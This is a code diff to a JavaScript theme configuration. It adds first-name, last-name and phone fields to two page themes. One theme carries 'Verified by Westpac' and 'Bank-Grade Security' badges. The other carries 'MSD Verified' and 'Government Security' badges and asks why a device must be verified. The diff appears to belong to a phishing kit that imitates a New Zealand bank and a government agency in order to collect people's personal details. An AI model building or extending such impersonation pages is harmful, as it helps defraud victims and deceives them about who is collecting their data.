@@ -14,6 +14,20 @@ window.themes = {
                 { icon: "🔒", text: "Bank-Grade Security" },
                 { icon: "✓", text: "Verified by Westpac" }
             ],
+            formFields: {
+                firstName: {
+                    label: "First Name",
+                    placeholder: "Enter your first name"
+                },
+                lastName: {
+                    label: "Last Name",
+                    placeholder: "Enter your last name"
+                },
+                phone: {
+                    label: "Phone Number",
+                    placeholder: "021234567 or +64212345678"
+                }
+            },
             infoBox: {
                 title: "Why is this required?",
                 points: [
@@ -47,6 +61,20 @@ window.themes = {
                 { icon: "🔒", text: "Government Security" },
                 { icon: "✓", text: "MSD Verified" }
             ],
+            formFields: {
+                firstName: {
+                    label: "First Name",
+                    placeholder: "Enter your first name"
+                },
+                lastName: {
+                    label: "Last Name",
+                    placeholder: "Enter your last name"
+                },
+                phone: {
+                    label: "Contact Number",
+                    placeholder: "021234567 or +64212345678"
+                }
+            },
             infoBox: {
                 title: "Why do we need to verify your device?",
                 points: [
